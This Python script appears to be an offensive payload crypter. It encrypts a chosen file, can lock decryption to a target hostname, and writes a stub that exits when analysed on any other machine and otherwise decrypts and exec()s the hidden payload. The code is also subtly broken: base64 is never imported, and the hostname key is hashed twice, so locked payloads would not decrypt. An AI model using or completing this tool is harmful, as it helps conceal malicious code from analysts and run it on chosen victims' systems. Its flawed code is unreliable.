import os
import hashlib
import random
import string
from cryptography.fernet import Fernet
from rich.console import Console

console = Console()


def encrypt_payload(file_path):
    """Encrypts a payload with environmental locking."""
    # LOCK: Payload only decrypts if it matches this environmental check
    target_lock = console.input(
        "[bold yellow]Target Hostname Lock (Leave blank for none): [/bold yellow]").strip()

    key_base = Fernet.generate_key()
    if target_lock:
        # Mutate the key using the target's hostname
        key_base = base64.urlsafe_b64encode(
            hashlib.sha256(key_base + target_lock.encode()).digest())

    cipher = Fernet(key_base)

    try:
        with open(file_path, "rb") as f:
            raw_data = f.read()

        encrypted_data = cipher.encrypt(raw_data)

        v_name = ''.join(random.choices(string.ascii_letters, k=8))
        stub = f"""
import os, base64, hashlib
from cryptography.fernet import Fernet

def run():
    k = b'{key_base.decode()}'
    lock = "{target_lock}"
    if lock and os.uname()[1] != lock: return # Anti-Analysis Fail-safe
    
    if lock:
        k = base64.urlsafe_b64encode(hashlib.sha256(k + lock.encode()).digest())
    
    cipher = Fernet(k)
    exec(cipher.decrypt(b'{encrypted_data.decode()}'))

if __name__ == "__main__": run()
"""
        with open("locked_payload.py", "w") as f:
            f.write(stub)
        console.print(
            "[bold green][+] Environmental Locked Payload generated: locked_payload.py[/bold green]")
    except Exception as e:
        console.print(f"[red][!] Encryption failed: {e}[/red]")
